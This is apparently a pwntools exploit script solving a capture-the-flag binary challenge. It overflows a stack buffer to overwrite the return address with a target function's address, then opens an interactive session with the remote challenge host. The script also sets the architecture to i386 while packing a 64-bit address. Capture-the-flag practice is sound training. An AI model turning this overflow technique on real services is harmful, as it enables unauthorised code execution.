from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./coffer-overflow-2"
HOST = "2020.redpwnc.tf"
PORT = 31908

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_binFunction = elf.symbols["binFunction"]

def exploit():
	bufsize = 0x10+8
	payload = "A"*bufsize
	payload += p64(addr_binFunction)
	conn.recvuntil("with?")
	conn.recvline()
	conn.sendline(payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
